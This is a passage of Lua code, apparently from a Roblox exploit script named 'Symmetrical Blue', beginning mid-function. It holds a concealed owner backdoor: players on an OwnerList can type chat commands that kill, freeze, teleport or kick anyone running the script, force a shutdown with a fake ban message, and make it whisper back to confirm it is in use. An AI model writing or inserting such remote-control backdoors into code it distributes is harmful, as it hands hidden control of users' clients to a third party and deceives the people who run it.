                                    seveneleven()
                                end
                            end
                        end
                    end)
                end)
            end)
            end
        end
        end)
        
        --. new point
        
        pcall(function()
        for _, Player2 in pairs(game:GetService("Players"):GetPlayers()) do
            if table.find(OwnerList,Player2.Name) then
                pcall(function()
                game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(msg)
                    pcall(function()
                        if msg.Message == '.checkusers' then
                            if msg.FromSpeaker == Player2.Name then
                                game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..Player2.Name..' Yes I am indeed using Symmetrical Blue', 'All');
                            end
                        end
                            
                        if msg.Message == '.kill '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player2.Name then
                                game:GetService("Players").LocalPlayer.Character:BreakJoints()
                            end
                        end 
        
                        if msg.Message == '.kill all' then
                            if msg.FromSpeaker == Player2.Name then
                                game:GetService("Players").LocalPlayer.Character:BreakJoints()
                            end
                        end 
                        
                        if msg.Message == '.shutdown '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player2.Name then
                                wait(.9)
                                game.Players.LocalPlayer:Kick("You Has Been Banned By Adminstration | To Appeal Contact Owner")
                                wait(2)
                                game:Shutdown()
                            end
                        end  
                            
                        if msg.Message == '.shutdown all' then
                            if msg.FromSpeaker == Player2.Name then
                               wait(.9)
                                game.Players.LocalPlayer:Kick("You Has Been Banned By Adminstration | To Appeal Contact Owner")
                                wait(2)
                                game:Shutdown()
                            end
                        end
        
                        if msg.Message == '.freeze '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player2.Name then
                                Frozen = true
                                repeat wait(1)
                                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true
                                until Frozen == false
                            end
                        end  
                            
                        if msg.Message == '.freeze all' then
                            if msg.FromSpeaker == Player2.Name then
                                Frozen = true
                                repeat wait(1)
                                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true
                                until Frozen == false
                            end
                        end
        
                        if msg.Message == '.unfreeze '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player2.Name then
                                Frozen = false
                                wait(1)
                                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Anchored = true
                            end
                        end

                        if msg.Message == '.bring '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player2.Name then
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Player2.Character.HumanoidRootPart.Position)
                            end
                        end  
                            
                        if msg.Message == '.bring all' then
                            if msg.FromSpeaker == Player2.Name then
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Player2.Character.HumanoidRootPart.Position)
                            end
                        end

                        if msg.Message == '.kfc '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player2.Name then
                                kfc()
                            end
                        end  
        
                        if msg.Message == '.kfc all' then
                            if msg.FromSpeaker == Player2.Name then
                                kfc()
                            end
                        end  
        
                        if msg.Message == '.walmart '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player2.Name then
                                walmart()
                            end
                        end  
        
                        if msg.Message == '.walmart all' then
                            if msg.FromSpeaker == Player2.Name then
                                walmart()
                            end
                        end 
        
                        if msg.Message == ',.target '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player2.Name then
                                target()
                            end
                        end  
        
                        if msg.Message == '.target all' then
                            if msg.FromSpeaker == Player2.Name then
                                target()
                            end
                        end
        
                        if msg.Message == '.mcdonalds '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player2.Name then
                                mcdonalds()
                            end
                        end  
        
                        if msg.Message == '.mcdonalds all' then
                            if msg.FromSpeaker == Player2.Name then
                                mcdonalds()
                            end
                        end
                        
                        if msg.Message == '.burgerking '..game:GetService("Players").LocalPlayer.Name or msg.Message == ',bking'..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player2.Name then
                                burgerking()
                            end
                        end  
        
                        if msg.Message == '.burgerking all' or msg.Message == 'bking all' then
                            if msg.FromSpeaker == Player2.Name then
                                burgerking()
                            end
                        end
        
                        if msg.Message == '.seveneleven '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player2.Name then
                                seveneleven()
                            end
                        end  
        
                        if msg.Message == '.seveneleven all' then
                            if msg.FromSpeaker == Player2.Name then
                                seveneleven()
                            end
                        end
                    end)
                end)
                end)
            end
        end
        end)
